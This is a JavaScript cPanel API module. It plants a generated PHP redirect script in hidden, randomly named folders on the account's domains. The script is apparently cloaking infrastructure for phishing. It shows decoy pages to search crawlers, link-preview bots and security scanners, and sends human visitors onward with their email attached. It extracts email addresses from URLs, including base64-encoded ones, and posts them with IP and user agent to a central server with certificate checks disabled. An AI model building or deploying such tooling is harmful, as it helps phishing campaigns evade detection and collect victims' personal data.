/**
 * cPanel API Service
 * Handles all interactions with cPanel UAPI for file management and domain operations
 */

import crypto from 'crypto';

// Encryption key for storing cPanel password (should be in env vars in production)
const ENCRYPTION_KEY = process.env.CPANEL_ENCRYPTION_KEY || 'your-32-character-secret-key-here!';
const ENCRYPTION_IV_LENGTH = 16;

/**
 * Encrypt a string using AES-256-CBC
 */
export function encryptPassword(password) {
  const iv = crypto.randomBytes(ENCRYPTION_IV_LENGTH);
  const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(password, 'utf8', 'hex');
  encrypted += cipher.final('hex');
  return iv.toString('hex') + ':' + encrypted;
}

/**
 * Decrypt a string using AES-256-CBC
 */
export function decryptPassword(encryptedPassword) {
  const parts = encryptedPassword.split(':');
  const iv = Buffer.from(parts[0], 'hex');
  const encryptedText = parts[1];
  const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
  let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

/**
 * cPanel API Service Class
 */
export class CpanelService {
  constructor(host, username, password) {
    // Ensure host has proper format
    this.host = host.replace(/\/$/, '');
    if (!this.host.startsWith('https://')) {
      this.host = 'https://' + this.host;
    }
    // Add port if not present
    if (!this.host.includes(':2083') && !this.host.includes(':2087')) {
      this.host = this.host + ':2083';
    }

    this.username = username;
    this.password = password;
    this.authHeader = 'Basic ' + Buffer.from(`${username}:${password}`).toString('base64');
  }

  /**
   * Make a request to cPanel UAPI
   */
  async makeRequest(module, func, params = {}, method = 'GET') {
    const url = new URL(`${this.host}/execute/${module}/${func}`);

    const options = {
      method,
      headers: {
        'Authorization': this.authHeader,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
    };

    if (method === 'GET') {
      Object.entries(params).forEach(([key, value]) => {
        url.searchParams.append(key, value);
      });
    } else {
      const formData = new URLSearchParams();
      Object.entries(params).forEach(([key, value]) => {
        formData.append(key, value);
      });
      options.body = formData.toString();
    }

    try {
      const response = await fetch(url.toString(), options);

      if (!response.ok) {
        const errorText = await response.text();
        throw new Error(`cPanel API error: ${response.status} - ${errorText}`);
      }

      const data = await response.json();

      if (data.status === 0) {
        throw new Error(data.errors?.join(', ') || 'cPanel API returned error status');
      }

      return data;
    } catch (error) {
      console.error('[CPANEL] API request failed:', error.message);
      throw error;
    }
  }

  /**
   * Test connection to cPanel
   */
  async testConnection() {
    try {
      // Try to get account info as a connection test
      const result = await this.makeRequest('Variables', 'get_user_information');
      return {
        success: true,
        user: result.data?.user || this.username,
        message: 'Connection successful'
      };
    } catch (error) {
      return {
        success: false,
        message: error.message
      };
    }
  }

  /**
   * List all domains (main, addon, subdomains)
   */
  async listDomains() {
    try {
      const result = await this.makeRequest('DomainInfo', 'list_domains');
      const domains = [];

      // Main domain
      if (result.data?.main_domain) {
        domains.push({
          domain: result.data.main_domain,
          documentRoot: result.data.main_domain_docroot || `/home/${this.username}/public_html`,
          type: 'main'
        });
      }

      // Addon domains
      if (result.data?.addon_domains && Array.isArray(result.data.addon_domains)) {
        for (const addon of result.data.addon_domains) {
          domains.push({
            domain: addon,
            documentRoot: `/home/${this.username}/${addon}`,
            type: 'addon'
          });
        }
      }

      // Subdomains
      if (result.data?.sub_domains && Array.isArray(result.data.sub_domains)) {
        for (const sub of result.data.sub_domains) {
          domains.push({
            domain: sub,
            documentRoot: `/home/${this.username}/${sub.split('.')[0]}`,
            type: 'subdomain'
          });
        }
      }

      // Parked domains (aliases)
      if (result.data?.parked_domains && Array.isArray(result.data.parked_domains)) {
        for (const parked of result.data.parked_domains) {
          domains.push({
            domain: parked,
            documentRoot: `/home/${this.username}/public_html`,
            type: 'parked'
          });
        }
      }

      return domains;
    } catch (error) {
      console.error('[CPANEL] Failed to list domains:', error.message);
      throw error;
    }
  }

  /**
   * Get detailed domain info with document roots
   */
  async getDomainsWithRoots() {
    try {
      // First get the list of domains
      const domainsResult = await this.makeRequest('DomainInfo', 'list_domains');

      // Then get document roots for each domain
      const domains = [];

      // Main domain
      if (domainsResult.data?.main_domain) {
        try {
          const docRoot = await this.makeRequest('DomainInfo', 'single_domain_data', {
            domain: domainsResult.data.main_domain
          });
          domains.push({
            domain: domainsResult.data.main_domain,
            documentRoot: docRoot.data?.documentroot || `/home/${this.username}/public_html`,
            type: 'main'
          });
        } catch (e) {
          domains.push({
            domain: domainsResult.data.main_domain,
            documentRoot: `/home/${this.username}/public_html`,
            type: 'main'
          });
        }
      }

      // Addon domains
      if (domainsResult.data?.addon_domains) {
        for (const addon of domainsResult.data.addon_domains) {
          try {
            const docRoot = await this.makeRequest('DomainInfo', 'single_domain_data', {
              domain: addon
            });
            domains.push({
              domain: addon,
              documentRoot: docRoot.data?.documentroot || `/home/${this.username}/${addon}`,
              type: 'addon'
            });
          } catch (e) {
            domains.push({
              domain: addon,
              documentRoot: `/home/${this.username}/${addon}`,
              type: 'addon'
            });
          }
        }
      }

      // Subdomains
      if (domainsResult.data?.sub_domains) {
        for (const sub of domainsResult.data.sub_domains) {
          try {
            const docRoot = await this.makeRequest('DomainInfo', 'single_domain_data', {
              domain: sub
            });
            domains.push({
              domain: sub,
              documentRoot: docRoot.data?.documentroot || `/home/${this.username}/${sub.split('.')[0]}`,
              type: 'subdomain'
            });
          } catch (e) {
            domains.push({
              domain: sub,
              documentRoot: `/home/${this.username}/${sub.split('.')[0]}`,
              type: 'subdomain'
            });
          }
        }
      }

      return domains;
    } catch (error) {
      console.error('[CPANEL] Failed to get domains with roots:', error.message);
      throw error;
    }
  }

  /**
   * Convert absolute path to relative path for cPanel API
   */
  toRelativePath(absolutePath) {
    const homePrefix = `/home/${this.username}/`;
    if (absolutePath.startsWith(homePrefix)) {
      return absolutePath.substring(homePrefix.length);
    } else if (absolutePath.startsWith('/home/')) {
      // Handle case where path has different username - extract relative part
      const parts = absolutePath.split('/');
      return parts.slice(3).join('/');
    }
    return absolutePath;
  }

  /**
   * Write file content to a path
   */
  async writeFile(documentRoot, filename, content) {
    try {
      const relativePath = this.toRelativePath(documentRoot);
      console.log('[CPANEL] writeFile - documentRoot:', documentRoot, 'relativePath:', relativePath);

      const result = await this.makeRequest('Fileman', 'save_file_content', {
        dir: relativePath,
        file: filename,
        content: content,
        charset: 'utf-8'
      }, 'POST');

      return {
        success: true,
        path: `${documentRoot}/${filename}`
      };
    } catch (error) {
      console.error('[CPANEL] Failed to write file:', error.message);
      throw error;
    }
  }

  /**
   * Delete a file
   */
  async deleteFile(documentRoot, filename) {
    try {
      const result = await this.makeRequest('Fileman', 'delete_files', {
        dir: documentRoot,
        files: filename
      }, 'POST');

      return {
        success: true,
        message: `Deleted ${filename}`
      };
    } catch (error) {
      console.error('[CPANEL] Failed to delete file:', error.message);
      throw error;
    }
  }

  /**
   * Create a directory using legacy API2
   */
  async createDirectory(parentDir, folderName) {
    try {
      const relativePath = this.toRelativePath(parentDir);
      console.log('[CPANEL] mkdir - parentDir:', parentDir, 'relativePath:', relativePath, 'folderName:', folderName);

      // Use legacy API2 Filemanager::mkdir with relative path
      const url = new URL(`${this.host}/json-api/cpanel`);
      url.searchParams.append('cpanel_jsonapi_apiversion', '2');
      url.searchParams.append('cpanel_jsonapi_module', 'Fileman');
      url.searchParams.append('cpanel_jsonapi_func', 'mkdir');
      url.searchParams.append('path', relativePath);
      url.searchParams.append('name', folderName);

      const response = await fetch(url.toString(), {
        method: 'GET',
        headers: {
          'Authorization': this.authHeader
        }
      });

      if (!response.ok) {
        throw new Error(`API2 mkdir failed: ${response.status}`);
      }

      const data = await response.json();
      if (data.cpanelresult?.error) {
        throw new Error(data.cpanelresult.error);
      }

      return {
        success: true,
        path: `${parentDir}/${folderName}`
      };
    } catch (error) {
      console.error('[CPANEL] Failed to create directory:', error.message);
      throw error;
    }
  }

  /**
   * Delete a directory and its contents
   */
  async deleteDirectory(parentDir, folderName) {
    try {
      const relativePath = this.toRelativePath(parentDir);
      console.log('[CPANEL] deleteDirectory - parentDir:', parentDir, 'relativePath:', relativePath, 'folderName:', folderName);

      // Use legacy API2 for directory deletion (more reliable)
      const url = new URL(`${this.host}/json-api/cpanel`);
      url.searchParams.append('cpanel_jsonapi_apiversion', '2');
      url.searchParams.append('cpanel_jsonapi_module', 'Fileman');
      url.searchParams.append('cpanel_jsonapi_func', 'fileop');
      url.searchParams.append('op', 'trash');
      url.searchParams.append('sourcefiles', `${relativePath}/${folderName}`);
      url.searchParams.append('doubledecode', '0');

      const response = await fetch(url.toString(), {
        method: 'GET',
        headers: {
          'Authorization': `Basic ${Buffer.from(`${this.username}:${this.password}`).toString('base64')}`
        }
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`);
      }

      const result = await response.json();
      console.log('[CPANEL] deleteDirectory result:', JSON.stringify(result, null, 2));

      if (result.cpanelresult?.error) {
        throw new Error(result.cpanelresult.error);
      }

      return {
        success: true,
        message: `Deleted directory ${folderName}`
      };
    } catch (error) {
      console.error('[CPANEL] Failed to delete directory:', error.message);
      throw error;
    }
  }

  /**
   * Check if file exists
   */
  async fileExists(documentRoot, filename) {
    try {
      await this.makeRequest('Fileman', 'get_file_content', {
        dir: documentRoot,
        file: filename
      });
      return true;
    } catch (error) {
      return false;
    }
  }

  /**
   * Get file content
   */
  async getFileContent(documentRoot, filename) {
    try {
      const result = await this.makeRequest('Fileman', 'get_file_content', {
        dir: documentRoot,
        file: filename
      });
      return result.data?.content || '';
    } catch (error) {
      return null;
    }
  }

  /**
   * Create or update .htaccess with redirect rules
   */
  async setupHtaccess(documentRoot) {
    const htaccessRules = `
# Redirect System Rules
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /

# Don't rewrite existing files or directories
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d

# Send all requests to redirect.php
RewriteRule ^(.*)$ redirect.php [L,QSA]
</IfModule>
# End Redirect System Rules
`;

    try {
      // Check if .htaccess exists
      const existingContent = await this.getFileContent(documentRoot, '.htaccess');

      if (existingContent) {
        // Check if our rules already exist
        if (existingContent.includes('# Redirect System Rules')) {
          return { success: true, message: '.htaccess already configured' };
        }

        // Append our rules to existing .htaccess
        const newContent = existingContent + '\n' + htaccessRules;
        await this.writeFile(documentRoot, '.htaccess', newContent);
        return { success: true, message: '.htaccess updated with redirect rules' };
      } else {
        // Create new .htaccess
        await this.writeFile(documentRoot, '.htaccess', htaccessRules.trim());
        return { success: true, message: '.htaccess created' };
      }
    } catch (error) {
      console.error('[CPANEL] Failed to setup .htaccess:', error.message);
      throw error;
    }
  }

  /**
   * Remove redirect rules from .htaccess
   */
  async cleanupHtaccess(documentRoot) {
    try {
      const existingContent = await this.getFileContent(documentRoot, '.htaccess');

      if (existingContent && existingContent.includes('# Redirect System Rules')) {
        // Remove our rules
        const cleanedContent = existingContent
          .replace(/\n?# Redirect System Rules[\s\S]*?# End Redirect System Rules\n?/g, '')
          .trim();

        if (cleanedContent) {
          await this.writeFile(documentRoot, '.htaccess', cleanedContent);
        } else {
          await this.deleteFile(documentRoot, '.htaccess');
        }

        return { success: true, message: '.htaccess cleaned up' };
      }

      return { success: true, message: 'No redirect rules found in .htaccess' };
    } catch (error) {
      console.error('[CPANEL] Failed to cleanup .htaccess:', error.message);
      throw error;
    }
  }

  /**
   * Generate a random folder name (100 characters, alphanumeric)
   */
  generateRandomFolderName(length = 100) {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let result = '';
    const randomBytes = crypto.randomBytes(length);
    for (let i = 0; i < length; i++) {
      result += chars[randomBytes[i] % chars.length];
    }
    return result;
  }

  /**
   * Deploy redirect script to a domain in a random folder
   */
  async deployRedirectScript(documentRoot, phpScript) {
    try {
      // Generate random 100-character folder name
      const folderName = this.generateRandomFolderName(100);
      const folderPath = `${documentRoot}/${folderName}`;

      // Create the random folder first
      await this.createDirectory(documentRoot, folderName);

      // Write the PHP script as index.php inside the folder
      await this.writeFile(folderPath, 'index.php', phpScript);

      return {
        success: true,
        message: 'Redirect script deployed successfully',
        folderName: folderName,
        folderPath: folderPath
      };
    } catch (error) {
      console.error('[CPANEL] Failed to deploy redirect script:', error.message);
      throw error;
    }
  }

  /**
   * Remove redirect script folder from a domain
   */
  async removeRedirectScript(documentRoot, folderName) {
    try {
      if (!folderName) {
        // Legacy cleanup for old deployments
        await this.deleteFile(documentRoot, 'redirect.php');
        await this.cleanupHtaccess(documentRoot);
        try {
          await this.deleteFile(documentRoot, 'redirect_cache.json');
        } catch (e) {}
        return { success: true, message: 'Legacy redirect script removed' };
      }

      // Delete the entire folder
      await this.deleteDirectory(documentRoot, folderName);

      return {
        success: true,
        message: 'Redirect script folder removed successfully'
      };
    } catch (error) {
      console.error('[CPANEL] Failed to remove redirect script:', error.message);
      throw error;
    }
  }
}

/**
 * Generate the PHP redirect script for deployment
 */
export function generateDeploymentScript(apiKey, centralServerUrl, humanUrl, botUrl) {
  return `<?php
/**
 * Secure Redirect System - Auto-deployed via cPanel
 * Generated: ${new Date().toISOString()}
 */

// Configuration
define('CENTRAL_SERVER_URL', '${centralServerUrl}');
define('API_KEY', '${apiKey}');
define('HUMAN_URL', '${humanUrl}');
define('BOT_URL', '${botUrl}');
define('CACHE_FILE', __DIR__ . '/redirect_cache.json');
define('CACHE_TTL', 300);

// Error handling
error_reporting(0);
ini_set('display_errors', 0);

/**
 * Local bot detection - runs before API call for speed
 * Returns 'BOT' if detected locally, null to continue to API check
 */
function localBotDetection() {
    \$userAgent = \$_SERVER['HTTP_USER_AGENT'] ?? '';
    \$userAgentLower = strtolower(\$userAgent);

    // 1. No user agent = bot
    if (empty(\$userAgent)) {
        return 'BOT';
    }

    // 2. Known bot/crawler user agents
    \$knownBots = [
        // Social media crawlers
        'telegrambot', 'twitterbot', 'facebookexternalhit', 'facebot',
        'linkedinbot', 'whatsapp', 'slackbot', 'discordbot', 'skypeuripreview',
        'vkshare', 'pinterestbot', 'tumblr', 'redditbot',
        // Search engines
        'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot',
        'slurp', 'sogou', 'exabot', 'ia_archiver', 'msnbot',
        // SEO/Analytics tools
        'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot',
        'screaming frog', 'seokicks', 'sistrix', 'blexbot',
        // Headless browsers
        'headlesschrome', 'phantomjs', 'puppeteer', 'playwright',
        'selenium', 'webdriver', 'chromedriver', 'geckodriver',
        // Generic bots
        'bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python-requests',
        'python-urllib', 'java/', 'httpclient', 'http_request', 'libwww',
        'lwp-', 'guzzlehttp', 'go-http-client', 'okhttp', 'axios',
        // Security scanners
        'nmap', 'nikto', 'sqlmap', 'masscan', 'zgrab', 'nuclei',
        // Preview/fetch services
        'preview', 'fetch', 'link', 'embed', 'oembed', 'iframely',
        'applebot', 'tweetmemebot', 'embedly'
    ];

    foreach (\$knownBots as \$bot) {
        if (strpos(\$userAgentLower, \$bot) !== false) {
            return 'BOT';
        }
    }

    // 3. Headless browser indicators in user agent
    \$headlessIndicators = [
        'headless', 'phantom', 'nightmare', 'electron', 'puppeteer',
        'playwright', 'selenium', 'webdriver', 'automation'
    ];

    foreach (\$headlessIndicators as \$indicator) {
        if (strpos(\$userAgentLower, \$indicator) !== false) {
            return 'BOT';
        }
    }

    // 4. Check for missing essential headers (bots often don't send these)
    \$hasAccept = !empty(\$_SERVER['HTTP_ACCEPT']);
    \$hasAcceptLanguage = !empty(\$_SERVER['HTTP_ACCEPT_LANGUAGE']);
    \$hasAcceptEncoding = !empty(\$_SERVER['HTTP_ACCEPT_ENCODING']);

    // If missing Accept-Language, likely a bot (real browsers always send this)
    if (!\$hasAcceptLanguage) {
        return 'BOT';
    }

    // 5. Suspicious Accept header patterns
    \$accept = \$_SERVER['HTTP_ACCEPT'] ?? '';
    if (\$accept === '*/*' && !\$hasAcceptLanguage) {
        return 'BOT';
    }

    // 6. Check for automation tool headers
    if (isset(\$_SERVER['HTTP_X_REQUESTED_WITH']) &&
        strtolower(\$_SERVER['HTTP_X_REQUESTED_WITH']) === 'puppeteer') {
        return 'BOT';
    }

    // 7. Very short user agents are suspicious
    if (strlen(\$userAgent) < 20) {
        return 'BOT';
    }

    // 8. User agent without version numbers (real browsers have versions)
    if (!preg_match('/\\d+\\.\\d+/', \$userAgent)) {
        return 'BOT';
    }

    // 9. Check for common browser identifiers (if none present, likely bot)
    \$browserIndicators = ['mozilla', 'chrome', 'safari', 'firefox', 'edge', 'opera', 'msie', 'trident'];
    \$hasBrowserIndicator = false;
    foreach (\$browserIndicators as \$browser) {
        if (strpos(\$userAgentLower, \$browser) !== false) {
            \$hasBrowserIndicator = true;
            break;
        }
    }

    if (!\$hasBrowserIndicator) {
        return 'BOT';
    }

    // Not detected as bot locally, continue to API
    return null;
}

/**
 * Get real client IP address
 */
function getClientIP() {
    \$headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach (\$headers as \$header) {
        if (!empty(\$_SERVER[\$header])) {
            \$ip = \$_SERVER[\$header];
            if (strpos(\$ip, ',') !== false) {
                \$ip = trim(explode(',', \$ip)[0]);
            }
            if (filter_var(\$ip, FILTER_VALIDATE_IP)) {
                return \$ip;
            }
        }
    }
    return \$_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}

/**
 * Extract email from URL parameters
 */
function extractEmail() {
    // Check common email parameter names
    \$emailParams = ['email', 'e', 'mail', 'em', 'user_email', 'subscriber_email'];
    foreach (\$emailParams as \$param) {
        if (isset(\$_GET[\$param]) && filter_var(\$_GET[\$param], FILTER_VALIDATE_EMAIL)) {
            return \$_GET[\$param];
        }
    }

    // Check for email in path (format: /email@example.com or /*email@example.com)
    \$path = \$_SERVER['REQUEST_URI'] ?? '';
    if (preg_match('/[\\/\\*\\$]([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,})/', \$path, \$matches)) {
        return \$matches[1];
    }

    // Check for base64 encoded email
    if (isset(\$_GET['d']) || isset(\$_GET['data'])) {
        \$encoded = \$_GET['d'] ?? \$_GET['data'];
        \$decoded = @base64_decode(\$encoded);
        if (\$decoded && filter_var(\$decoded, FILTER_VALIDATE_EMAIL)) {
            return \$decoded;
        }
    }

    return null;
}

/**
 * Classify visitor via central server
 * Note: /api/classify already logs the visit, so no separate log call needed
 */
function classifyVisitor() {
    \$ip = getClientIP();
    \$userAgent = \$_SERVER['HTTP_USER_AGENT'] ?? '';
    \$referer = \$_SERVER['HTTP_REFERER'] ?? '';

    \$data = [
        'ip_address' => \$ip,
        'user_agent' => \$userAgent,
        'referer' => \$referer
    ];

    \$ch = curl_init(CENTRAL_SERVER_URL . '/api/classify');
    curl_setopt_array(\$ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query(\$data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => [
            'X-API-Key: ' . API_KEY,
            'Content-Type: application/x-www-form-urlencoded'
        ]
    ]);

    \$response = curl_exec(\$ch);
    \$httpCode = curl_getinfo(\$ch, CURLINFO_HTTP_CODE);
    \$curlError = curl_error(\$ch);
    curl_close(\$ch);

    // Debug logging (can be disabled in production)
    error_log("Classify API Response: HTTP \$httpCode - \$response - Error: \$curlError");

    if (\$httpCode === 200 && \$response) {
        \$result = json_decode(\$response, true);
        return \$result['classification'] ?? 'HUMAN';
    }

    // Default to human on API failure
    return 'HUMAN';
}

/**
 * Capture email to central server
 */
function captureEmail(\$email) {
    if (!\$email) return;

    \$data = [
        'email' => \$email,
        'ip_address' => getClientIP(),
        'user_agent' => \$_SERVER['HTTP_USER_AGENT'] ?? '',
        'source_url' => \$_SERVER['REQUEST_URI'] ?? ''
    ];

    \$ch = curl_init(CENTRAL_SERVER_URL . '/api/capture-email');
    curl_setopt_array(\$ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode(\$data),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 2,
        CURLOPT_HTTPHEADER => [
            'X-API-Key: ' . API_KEY,
            'Content-Type: application/json'
        ]
    ]);
    curl_exec(\$ch);
    curl_close(\$ch);
}

// Main execution
\$email = extractEmail();

// Step 1: Local bot detection (fast, no API call needed)
\$classification = localBotDetection();

// Step 2: If not detected locally as bot, check with central API
if (\$classification === null) {
    \$classification = classifyVisitor();
}

// Capture email if found (only for humans)
if (\$email && \$classification === 'HUMAN') {
    captureEmail(\$email);
}

// Note: Visit is logged by /api/classify endpoint (if API was called)

// Determine redirect URL
\$redirectUrl = (\$classification === 'BOT') ? BOT_URL : HUMAN_URL;

// Build redirect URL with email parameter for humans
if (\$classification === 'HUMAN' && \$email && strpos(\$redirectUrl, '?') === false) {
    \$redirectUrl .= '?email=' . urlencode(\$email);
} elseif (\$classification === 'HUMAN' && \$email) {
    \$redirectUrl .= '&email=' . urlencode(\$email);
}

// Perform redirect
header('HTTP/1.1 302 Found');
header('Location: ' . \$redirectUrl);
header('Cache-Control: no-cache, no-store, must-revalidate');
exit;
`;
}

export default CpanelService;
